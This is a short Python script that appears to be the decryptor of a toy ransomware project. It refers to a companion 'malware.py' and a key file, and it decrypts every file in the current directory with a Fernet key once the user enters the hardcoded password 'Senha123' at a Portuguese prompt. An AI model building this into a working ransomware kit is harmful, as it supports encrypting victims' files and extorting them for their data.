import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file in ('malware.py', 'thekey.key', 'decrypt.py', '.gitigore', 'requirements.txt'):
        continue
    if os.path.isfile(file):
        files.append(file)

with open('thekey.key', 'rb') as thekey:
    secretkey = thekey.read()

passpharase = 'Senha123'
upasspharase = input('Digite a senha para descritografar seus dados: ')

if passpharase == upasspharase:
    for file in files:
        with open(file, 'rb') as thefile:
            encrypted_content = thefile.read()

        content = Fernet(secretkey).decrypt(encrypted_content)

        with open(file, 'wb') as thefile:
            thefile.write(content)
    print('Arquivos descriptografados.')
else:
    print('Senha incorreta.')